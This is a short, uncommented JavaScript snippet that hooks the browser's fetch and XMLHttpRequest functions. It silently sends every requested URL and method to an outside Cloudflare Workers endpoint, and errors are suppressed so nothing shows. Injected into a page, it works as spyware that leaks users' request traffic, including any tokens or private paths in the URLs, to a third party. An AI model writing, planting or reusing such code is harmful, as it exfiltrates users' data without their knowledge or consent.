(function(){

const WORKER = "https://memek-worker.defoy89122.workers.dev/";

function send(msg){
    fetch(WORKER + "?message=" + encodeURIComponent(msg))
        .catch(()=>{});
}

const oldFetch = window.fetch;

window.fetch = function(...args){

    send("[FETCH] " + args[0]);

    return oldFetch.apply(this,args);
};

const oldOpen = XMLHttpRequest.prototype.open;

XMLHttpRequest.prototype.open = function(method,url){

    send("[XHR] " + method + " " + url);

    return oldOpen.apply(this,arguments);
};

})();
